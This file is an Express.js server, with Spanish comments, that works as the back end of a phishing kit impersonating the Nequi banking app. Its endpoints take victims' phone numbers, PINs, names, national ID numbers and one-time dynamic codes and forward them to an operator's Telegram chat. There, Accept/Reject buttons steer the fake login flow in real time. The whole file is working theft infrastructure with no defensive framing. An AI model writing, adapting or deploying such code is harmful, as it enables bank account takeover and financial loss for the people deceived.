const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const estados = {}; // Guarda decisiones por número

// Enviar mensaje con botones (inicio Nequi)
app.post('/enviar', async (req, res) => {
  const { numero, clave, nombre, cedula } = req.body;

  const mensaje = `🟣 Nueva solicitud Nequi:\n\n👤 Nombre: ${nombre}\n🆔 Cédula: ${cedula}\n📞 Número: ${numero}\n🔑 Clave: ${clave}`;

  const payload = {
    chat_id: CHAT_ID,
    text: mensaje,
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Aceptar', callback_data: `aceptar_${numero}` },
          { text: '❌ Rechazar', callback_data: `rechazar_${numero}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  res.send({ ok: true });
});

// Enviar mensaje de validación dinámica
app.post('/dinamica', async (req, res) => {
  const { numero, dinamica } = req.body;

  const payload = {
    chat_id: CHAT_ID,
    text: `🔁 Validación dinámica:\n\n📱 Número: ${numero}\n📘 Respuesta: ${dinamica}`,
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Dinámica Correcta', callback_data: `correcta_${numero}` },
          { text: '❌ Dinámica Incorrecta', callback_data: `incorrecta_${numero}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  res.send({ ok: true });
});

// Webhook general (maneja ambos tipos de botones)
app.post('/webhook', async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(400);

  const data = callback.data;
  const [accion, numero] = data.split('_');

  // Guardamos el estado de manera dinámica
  estados[numero] = accion;

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has elegido: ${accion === 'correcta' ? 'Dinámica Correcta' : accion === 'incorrecta' ? 'Dinámica Incorrecta' : accion}`
    })
  });

  res.sendStatus(200);
});

// Consultar estado del inicio (aceptar/rechazar)
app.get('/estado/:numero', (req, res) => {
  const numero = req.params.numero;
  res.send({ estado: estados[numero] || null });
});

// Consultar estado de dinámica (correcta/incorrecta)
app.get('/dinamica_estado/:numero', (req, res) => {
  const numero = req.params.numero;
  res.send({ estado: estados[numero] || null });
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Servidor funcionando en el puerto', PORT));
